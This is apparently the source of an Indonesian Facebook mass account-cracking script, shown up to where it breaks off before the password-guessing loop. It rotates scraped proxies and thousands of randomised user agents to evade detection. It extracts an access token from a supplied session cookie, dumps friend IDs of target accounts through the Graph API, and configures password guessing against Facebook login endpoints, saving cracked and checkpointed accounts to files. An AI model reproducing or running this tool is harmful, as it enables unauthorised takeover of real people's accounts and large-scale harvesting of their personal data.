#-----------------[ IMPORT-MODULE ]-------------------
import requests,json,os,sys,random,datetime,time,re
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
from concurrent.futures import ThreadPoolExecutor as tred
from rich.markdown import Markdown as mark
from rich.console import Console as sol
from rich.panel import Panel as panel
from rich import print as cetak
from rich.tree import Tree
import zlib
import subprocess
import base64

from rich import pretty
pretty.install()
CON=sol()
#------------------[ USER-AGENT ]-------------------#
pretty.install()
CON=sol()
ugen3=[]
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
from rich.console import Console
from rich.columns import Columns
wa = Console()
try:
	prox= requests.get("https://api.proxyscrape.com/?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all").text
	open('.proxy.txt','w').write(prox)
except Exception as e:
    exit(e)
for xd in range(10000):
    a='Mozilla/5.0 (Linux; Android'
    b=random.randrange(1, 9)
    c=random.randrange(1, 9)
    d='iphone os 12_2 like mac osX) Robby-Tzy'
    e=random.randrange(100, 9999)
    f='AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1 Mobile/'
    g=random.randrange(1, 9)
    h=random.randrange(1, 4)
    i=random.randrange(1, 4)
    j=random.randrange(1, 4)
    k='15E148 Safari/604.1'
    uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
    ugen2.append(uaku)

    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['6','7','8','9','10','11','12'])
    c='CPU iPhone OS 12_2 like Mac OS X) Robby-Tzy'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/605.1.15 (KHTML, like Gecko)'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.6.4-gn'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
for x in range(10):
	a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
	b=random.randrange(100, 9999)
	c=random.randrange(100, 9999)
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	h=random.randrange(1, 9)
	i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
	j=random.randrange(1, 9)
	k=random.randrange(1, 9)
	l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'
	uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
	ugen.append(uak)
def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua : 
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.bbnew.txt','r').read().splitlines()
ua = random.choice(['Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; SM-G980F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 6.0; iCherry C233 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Mobile Safari/537.36',
'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:15.0) Gecko/20100101 Firefox/15.0.1',
'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]',
'Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)',
'Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36'])


#------------[ INDICATION ]---------------#
id,id2,loop,ok,cp,akun,oprek,method,taplikasi,tokenku,uid= [],[],0,0,0,[],[],[],[],[],[]
cokbrut=[]
uadia, uadarimu = [],[]
pwpluss,pwnya=[],[]
###----------[ CHECK THEME COLOR ]---------- ###
try:
	color_table = "#00C8FF"
except FileNotFoundError:
	color_table = "#00C8FF"
#------------[ WARNA ]--------------#
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])

def tahunng(fx):
	if len(fx)==15:
		if fx[:10] in ['1000000000']       :tahunz = '2009'
		elif fx[:9] in ['100000000']       :tahunz = '2009'
		elif fx[:8] in ['10000000']        :tahunz = '2009'
		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'
		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'
		elif fx[:6] in ['100001']          :tahunz = '2010-2011'
		elif fx[:6] in ['100002','100003'] :tahunz = '2011-2012'
		elif fx[:6] in ['100004']          :tahunz = '2012-2013'
		elif fx[:6] in ['100005','100006'] :tahunz = '2013-2014'
		elif fx[:6] in ['100007','100008'] :tahunz = '2014-2015'
		elif fx[:6] in ['100009']          :tahunz = '2015'
		elif fx[:5] in ['10001']           :tahunz = '2015-2016'
		elif fx[:5] in ['10002']           :tahunz = '2016-2017'
		elif fx[:5] in ['10003']           :tahunz = '2018'
		elif fx[:5] in ['10004']           :tahunz = '2019'
		elif fx[:5] in ['10005']           :tahunz = '2020'
		elif fx[:5] in ['10006','10007','10008']:tahunz = '2021-2022'
		else:tahunz=''
	elif len(fx) in [9,10]:
		tahunz = '2008-2009'
	elif len(fx)==8:
		tahunz = '2007-2008'
	elif len(fx)==7:
		tahunz = '2006-2007'
	else:tahunz=''
	return tahunz

#--------------------[ CONVERTER-BULAN ]--------------#
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
#--------------------[ MENU-AWAL ]--------------#
cetak(panel(f"""[bold green]GUNAKAN SCRIPT INI SEBAIK DAN SEWAJAR MUNGKIN,ADMIN TIDAK BERTANGGUNG JAWAB ATAS PENYALAHGUNAAN TOOLS INI,TERIMA KASIH[/]""",width=70,title=f"[bold green]• [bold yellow]• [bold red]• [bold white]PESAN [bold red]• [yellow]• [bold green]•",style=f"{color_table}"))
tree = Tree(f" [[cyan]![/]] [bold green]TUNGGU BEBERAPA SAAT UNTUK MASUK KE DALAM MENU")
cetak(tree)
time.sleep(4)
#------------------[ MACHINE-SUPPORT ]---------------#
def renv_xy(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def clear():
        os.system('clear')
#BANNER
def banner():
	clear()
def back():
	menu()
#------------------[ LOGO-BANNER ]-----------------#
def banner():
	cetak(panel(f"""\t[red]╔═══╦══╦═╗╔═╦═══╦╗──╔═══╗╔═══╦═══╦══╗╔═══╦═══╦═╗─╔╗
\t[red]║╔═╗╠╣╠╣║╚╝║║╔═╗║║──║╔══╝║╔═╗║╔══╣╔╗║║╔═╗║╔═╗║║╚╗║║
\t[red]║╚══╗║║║╔╗╔╗║╚═╝║║──║╚══╗║╚═╝║╚══╣╚╝╚╣║─║║╚═╝║╔╗╚╝║
\t[white]╚══╗║║║║║║║║║╔══╣║─╔╣╔══╝║╔╗╔╣╔══╣╔═╗║║─║║╔╗╔╣║╚╗║║
\t[white]║╚═╝╠╣╠╣║║║║║║──║╚═╝║╚══╗║║║╚╣╚══╣╚═╝║╚═╝║║║╚╣║─║║║
\t[white]╚═══╩══╩╝╚╝╚╩╝──╚═══╩═══╝╚╝╚═╩═══╩═══╩═══╩╝╚═╩╝─╚═╝                       
                    [bold white]𝖬𝖺𝖽𝖾 𝖡𝗒 [bold red]𝖨𝗇𝖽𝗈𝗇𝖾𝗌𝗂𝖺𝗇[cyan] 𝖢𝗈𝖽𝖾𝗋[bold white]""",width=70,title=f"[bold green]• [bold yellow]• [bold red]• [bold white]𝖫𝖮𝖦𝖮 𝖡𝖠𝖭𝖭𝖤𝖱 [bold red]• [yellow]• [bold green]•",subtitle=f"[bold green]• [bold yellow]• [bold red]• [bold white]𝖵𝖾𝗋𝗌𝗂𝗈𝗇 [bold green]2.0[/] [bold red]• [yellow]• [bold green]•",style=f"{color_table}"))
#--------------------[ BAGIAN-MASUK ]--------------#
def linex():
	print("%s══════════════════════════════════════════════════════════════════════%s"%(P,P))
	
def Code_():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=name,id,birthday&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			sy4 = json.loads(sy.text)['birthday']
			menu(sy2,sy3,sy4)
		except KeyError:
			login_lagi334()
		except requests.exceptions.ConnectionError:
			li = ' PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN '
			lo = mark(li, style='red')
			sol().print(lo, style='cyan')
			exit()
	except IOError:
		login_lagi334()
def login_lagi334():
	try:
		os.system('clear')
		banner()
		cetak(panel(f'     [white]Cookies Capture Extension Suggestion : [green]Cookiedough[white]',width=70,title=f"[bold green]• [bold yellow]• [bold red]• [bold white]LOGIN MENU [bold red]• [yellow]• [bold green]•",style=f"{color_table}"))
		asu = random.choice([h])
		cookie=input(f'Enter Cookies :{asu} ')
		data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookie}) 
		find_token = re.search("(EAAG\w+)", data.text)
		ken=open(".token.txt", "w").write(find_token.group(1))
		cok=open(".cok.txt", "w").write(cookie)
		print(f'{x}[{h}•{x}]{h} LOGIN SUCCESSFUL.........Run the command again!!!!{x} ');time.sleep(1)
		exit()
	except Exception as e:
		os.system("rm -f .token.txt")
		os.system("rm -f .cok.txt")
		print(f'  %s[%sx%s]%s LOGIN FAILED.....CHECK YOUR ACCOUNT !!%s'%(x,k,x,m,x))
		exit()

def menu(name,id,birthday):
	try:
#		keyx()
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		print('[×] Expired Cookies ')
		time.sleep(5)
		login_lagi334()
	os.system('clear')
	banner()
	ip = requests.get("https://api.ipify.org").text
	urut = []
	urut.append(panel(f'[cyan]𝖭𝖺𝗆𝖾 : {name}\n𝖨𝖣   : {id}\n𝖳𝖳𝖫  : {birthday}',width=34,padding=(0,2),title=f"[yellow]• 𝖨𝖭𝖥𝖮𝖱𝖬𝖠𝖳𝖨𝖮𝖭 •[/]",style=f"{color_table}"))
	urut.append(panel(f'[cyan]𝖨𝖯      : {ip}\n𝖳𝖺𝗇𝗀𝗀𝖺𝗅 : {tgl} {bln} {thn}\n𝖱𝖾𝖼𝗈𝖽𝖾  : 𝖠𝖦𝖴𝖭𝖦-𝖷𝖣',width=34,padding=(0,2),title=f"[yellow]• 𝖨𝖭𝖥𝖮𝖱𝖬𝖠𝖳𝖨𝖮𝖭 •[/]",style=f"{color_table}"))
	wa.print(Columns(urut))
	cetak(panel(f'\t             [white][bold green] 𝖲𝖤𝖫𝖤𝖢𝖳 𝖳𝖧𝖤 𝖲𝖢𝖱𝖨𝖯𝖳 𝖬𝖤𝖭𝖴',width=70,title=f"[bold green]• [bold yellow]• [bold red]• [bold white]SIMPLE [bold red]• [yellow]• [bold green]•",style=f"{color_table}"))
	print(f' [{b}01{x}]. 𝖢𝗋𝖺𝖼𝗄 𝖠𝗄𝗎𝗇 𝖬𝖺𝗌𝗌𝖺𝗅\n [{b}02{x}]. 𝖢𝗁𝖾𝖼𝗄 𝖱𝖾𝗌𝗎𝗅𝗍 𝖢𝗋𝖺𝖼𝗄\n [{b}03{x}]. 𝖢𝗁𝖾𝖼𝗄 𝖮𝗉𝗌𝗂 𝖢𝗁𝖾𝖼𝗄𝗉𝗈𝗂𝗇𝗍\n [{b}00{x}]. 𝖤𝗑𝗂𝗍')
	_____renv__renv_____ = input(f'\n [{b}?{x}] 𝖲𝖾𝗅𝖾𝖼𝗍 : ')
	print('')
	if _____renv__renv_____ in ['1']:
		dump_massal()
	elif _____renv__renv_____ in ['2']:
		result()
	elif _____renv__renv_____ in ['3']:
		ingfo()
	elif _____renv__renv_____ in ['0']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cookie.txt')
		print('>> Successfully Logout+Delete Cookies ')
		exit()
	else:
		print('>> input correctly ')
		back()
def error():
	print(f'{k}>> Sorry, this feature is still being fixed {x}')
	time.sleep(4)
	back()
	
#-----------------[ HASIL-CRACK ]-----------------#
def result():
	print('╰─ 1. Hasil CP Anda ')
	print('╰─ 2. Hasil OK Anda ')
	print('╰─ 0. Kembali	')
	kz = input('\n╰─ Chouse : ')
	print('')
	if kz in ['1','01']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			print('╰─ File Tidak Di Temukan ')
			time.sleep(3)
			back()
		if len(vin)==0:
			print('╰─ Anda Tidak Memiliki Hasil CP ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = ''+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(''+nom+'. '+isi+'\033[31m '+str(len(hem))+' \033[0mcekpoint '+x)
				else:
					lol.update({str(cih):str(isi)})
					print(''+str(cih)+'. '+isi+'\033[31m '+str(len(hem))+' \033[0mcekpoint '+x)
			geeh = input('\n╰─ Chouse : ')
			print('')
			try:geh = lol[geeh]
			except KeyError:
				print('╰─ Pilih Yang Bener Kontol ')
				exit()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				print('╰─ File Tidak Di Temukan ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print(f'╰─CP\033[33m {cpkuni[0]}|{cpkuni[1]}\033[0m')
				nocp +=1
			input('\n╰─ Back Enter ')
			back()
	elif kz in ['2','02']:
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			print('╰─ File Tidak Di Temukan ')
			time.sleep(2)
			back()
		if len(vin)==0:
			print('╰─ Anda Tidak Mempunyai File OK ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<100:
					nom = ''+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(''+nom+'. '+isi+'\033[32m '+str(len(hem))+' \033[0mSucses '+x)
				else:
					lol.update({str(cih):str(isi)})
					print(''+str(cih)+'. '+isi+'\033[32m '+str(len(hem))+' \033[0mSucses '+x)
			geeh = input('\n╰─ Chouse : ')
			try:geh = lol[geeh]
			except KeyError:
				print('╰─ Pilih Yang Bener Kontol ')
				exit()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				print('╰─ File Tidak Di Temukan ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print(f'\n╰─OK\033[32m {cpkuni[0]}|{cpkuni[1]}|\033[32m{cpkuni[2]}\033[0m')
				nocp +=1
			input('\n╰─ Back Enter ')
			back()
	elif kz in ['0','00']:
		back()
	else:
		print('╰─ Pilih Yang Bener Kontol ')
		exit()
#-------------------[ CRACK-PUBLIK ]----------------#
def dump_massal():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	try:
		jum = int(input(f' [{b}>{x}] 𝖬𝖺𝗎 𝖡𝖾𝗋𝖺𝗉𝖺 𝖳𝖺𝗋𝗀𝖾𝗍 𝖭𝗃𝗂ng ? : '))
	except ValueError:
		print('>> wrong input ')
		exit()
	if jum<1 or jum>100:
		print(f' [{b}*{x}] Failed Dump Id maybe id is not public ')
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = input(f' [{b}>{x}] 𝖬𝖺𝗌𝗎𝗄𝖺𝗇 𝖨𝖽𝗓 𝖪𝖾 '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			print(' >> unstable signal ')
			exit()
	try:
		print(f' [{b}>{x}] 𝖳𝗈𝗍𝖺𝗅 𝖣𝗎𝗆𝗉 : {h}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
		print('>> unstable signal ')
		back()
	except (KeyError,IOError):
		print(f' >>{k} Friendship Not Public {x}')
		time.sleep(3)
		back()
#-------------[ PENGATURAN-IDZ ]---------------#
def setting():
	cetak(panel(f'\t              [bold green]𝖨𝖣 𝖮𝖱𝖣𝖤𝖱 𝖲𝖤𝖳𝖳𝖨𝖭𝖦 𝖢𝖱𝖠𝖢𝖪',width=70,title=f"[bold green]• [bold yellow]• [bold red]• [bold white]SIMPLE [bold red]• [yellow]• [bold green]•",style=f"{color_table}"))
	print(f' [{b}01{x}]. 𝖨𝖣 𝖠𝗄𝗎𝗇 𝖮𝗅𝖽  ({M}Not Recommend{M}{x}){x} ')
	print(f' [{b}02{x}]. 𝖨𝖣 𝖠𝗄𝗎𝗇 𝖭𝖾𝗐  ({H}Recommended{H}{x}){x}  ')
	print(f' [{b}03{x}]. 𝖨𝖣 𝖠𝗄𝗎𝗇 𝖠𝖼𝖺𝗄 ({K}Very Recommended{K}{x}){x} ')
	print('')
	hu = input(f' [{b}?{x}] Select : ')
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)
	elif hu in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print('>> input correctly ')
		exit()
		print('')		
	cetak(panel(f'\t             [bold green] 𝖨𝖭𝖯𝖴𝖳 𝖬𝖤𝖳𝖮𝖣𝖤 𝖴𝖱𝖫 𝖫𝖮𝖦𝖨𝖭',width=70,title=f"[bold green]• [bold yellow]• [bold red]• [bold white]𝖵𝖠𝖫𝖨𝖣𝖠𝖳𝖤 [bold red]• [yellow]• [bold green]•",style=f"{color_table}"))
	print(f' [{b}01{x}]. 𝖫𝗈𝗀𝗂𝗇 𝖥𝗋𝗈𝗆 {b}𝖬𝗈𝖻𝗂𝗅𝖾.𝖿𝖺𝖼𝖾𝖻𝗈𝗈𝗄.𝖼𝗈𝗆{x} (𝖵𝖾𝗋𝗒 𝖲𝗅𝗈𝗐)')
	print(f' [{b}02{x}]. 𝖫𝗈𝗀𝗂𝗇 𝖥𝗋𝗈𝗆 {b}𝖥𝗋𝖾𝖾.𝖿𝖺𝖼𝖾𝖻𝗈𝗈𝗄.𝖼𝗈𝗆{x}   (𝖵𝖾𝗋𝗒 𝖥𝖺𝗌𝗍)')
	print(f' [{b}03{x}]. 𝖫𝗈𝗀𝗂𝗇 𝖥𝗋𝗈𝗆 {b}𝖬𝖻𝖺𝗌𝗂𝖼.𝖿𝖺𝖼𝖾𝖻𝗈𝗈𝗄.𝖼𝗈𝗆{x} (𝖲𝖾𝗆𝗂 𝖥𝖺𝗌𝗍)')
	print(f' [{b}04{x}]. 𝖫𝗈𝗀𝗂𝗇 𝖥𝗋𝗈𝗆 {b}𝖬𝗈𝖻𝗂𝗅𝖾.𝖿𝖺𝖼𝖾𝖻𝗈𝗈𝗄.𝖼𝗈𝗆{x} (𝖲𝗅𝗈𝗐 𝖵2)')	
	cetak(panel(f'[bold green]𝖭𝗈𝗍𝖾 : 𝖦𝗎𝗇𝖺𝗄𝖺𝗇 𝖬𝖾𝗍𝗈𝖽𝖾 𝖸𝖺𝗇𝗀 𝖣𝗂 𝖱𝖺𝗌𝖺 𝖢𝗈𝖼𝗈𝗄 𝖣𝖾𝗇𝗀𝖺𝗇 𝖣𝖾𝗏𝗂𝖼𝖾 𝖣𝖺𝗇 𝖪𝖺𝗋𝗍𝗎\n𝖣𝖾𝗇𝗀𝖺𝗇 𝖢𝖺𝗋𝖺 𝖳𝖾𝗌 1 𝖯𝖾𝗋 1[bold white]',width=70,title=f"[bold green]• [bold yellow]• [bold red]• [bold white]SIMPLE [bold red]• [yellow]• [bold green]•",style=f"{color_table}"))
	hc = input(f' [{b}?{x}] 𝖢𝗁𝗈𝗈𝗌𝖾 : ')
	if hc in ['1','01']:
		method.append('mobile')
	elif hc in ['2','02']:
		method.append('free')
	elif hc in ['3','03']:
		method.append('mbasic')
	elif hc in ['4','04']:
		method.append('Mobile-v2')
	else:
		method.append('mobile')
	cetak(panel(f'[bold green]𝖩𝗂𝗄𝖺 𝖠𝗇𝖽𝖺 𝖦𝗎𝗇𝖺𝗄𝖺𝗇 𝖯𝖺𝗌𝗌𝗐𝗈𝗋𝖽 𝖬𝖺𝗇𝗎𝖺𝗅 , 𝖬𝖺𝗄𝖺 𝖯𝖺𝗌𝗌𝗐𝗈𝗋𝖽 𝖳𝖺𝗆𝖻𝖺𝗁𝖺𝗇 𝖠𝗇𝖽𝖺 𝖠𝗄𝖺𝗇 𝖳𝖾𝗋 𝖣𝖾𝗍𝖾𝖼𝗄\n𝖩𝗂𝗄𝖺 𝖳𝗂𝖽𝖺𝗄 𝖨𝗇𝗀𝗂𝗇 𝖦𝗎𝗇𝖺𝗄𝖺𝗇 𝖯𝖺𝗌𝗌𝗐𝗈𝗋𝖽 𝖬𝖺𝗇𝗎𝖺𝗅 𝖪𝖾𝗍𝗂𝗄 [red]t[/] [bold green]𝖯𝖺𝖽𝖺 𝖯𝗂𝗅𝗂𝗁𝖺𝗇 [white]',width=70,title=f"[bold green]• [bold yellow]• [bold red]• [bold white]SIMPLE [bold red]• [yellow]• [bold green]•",style=f"{color_table}"))
	pwplus=input(f' [{b}?{x}] 𝖦𝗎𝗇𝖺𝗄𝖺𝗇 𝖯𝖺𝗌𝗌𝗐𝗈𝗋𝖽 𝖬𝖺𝗇𝗎𝖺𝗅 ? ({h}𝗒{x}/{m}n{x}) : ')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		cetak(panel('[bold white]𝖤𝗇𝗍𝖾𝗋 𝖠𝗇𝖽 𝖠𝖽𝗂𝗍𝗂𝗈𝗇𝖺𝗅 𝖯𝖺𝗌𝗐𝗐𝗈𝗋𝖽 𝖮𝖿 𝖠𝗍 𝖫𝖾𝖺𝗌𝗍 6 𝖢𝗁𝖺𝗋𝖺𝗄𝗍𝖾𝗋\n𝖤𝗑𝖺𝗆𝗉𝗅𝖾 :[green] 𝗂𝗇𝖽𝗈𝗇𝖾𝗌𝗂𝖺,𝗋𝖺𝗁𝖺𝗌𝗂𝖺,𝗄𝖺𝗍𝖺𝗌𝖺𝗇𝖽𝗂[white]',width=70,title=f"[bold green]• [bold yellow]• [bold red]• [bold white]𝖲𝖨𝖬𝖯𝖫𝖤 [bold red]• [yellow]• [bold green]•",style=f"{color_table}"))
		pwku=input(f' [{b}?{x}] 𝖬𝖺𝗌𝗎𝗄𝖺𝗇 𝖯𝖺𝗌𝗌𝗐𝗈𝗋𝖽 𝖬𝖺𝗇𝗎𝖺𝗅 : ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
		pwpluss.append('no')
	ua = input(f' [{b}?{x}] 𝖦𝗎𝗇𝖺𝗄𝖺𝗇 𝖴𝗌𝖾𝗋 𝖠𝗀𝖾𝗇𝗍 𝖬𝖺𝗇𝗎𝖺𝗅 ? ({h}y{x}/{m}n{x}) : ')
	if ua in ['y','Ya','ya','Y']:
		uadarimu.append('uadia');bz = input(f' [{b}?{x}] 𝖬𝖺𝗌𝗎𝗄𝖺𝗇 𝖴𝗌𝖾𝗋 𝖠𝗀𝖾𝗇𝗍 : ');uadia.append(bz)
	else:uadarimu.append('uasc')
	passwrd()
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	cetak(panel(f'           [white]𝖱𝖾𝗌𝗎𝗅𝗍𝗌 [green]𝖮𝖪[white] 𝖲𝖺𝗏𝖾 𝖨𝗇 : [green]𝖮𝖪/%s [white]'%(okc),width=70,title=f"[bold green]• [bold yellow]• [bold red]• [bold white]OK SAVE [bold red]• [yellow]• [bold green]•",style=f"{color_table}"))
	cetak(panel(f'           [white]𝖱𝖾𝗌𝗎𝗅𝗍𝗌 [yellow]𝖢𝖯[white] 𝖲𝖺𝗏𝖾 𝖨𝗇 : [yellow]𝖢𝖯/%s [white]'%(cpc),width=70,title=f"[bold green]• [bold yellow]• [bold red]• [bold white]CP SAVE [bold red]• [yellow]• [bold green]•",style=f"{color_table}"))
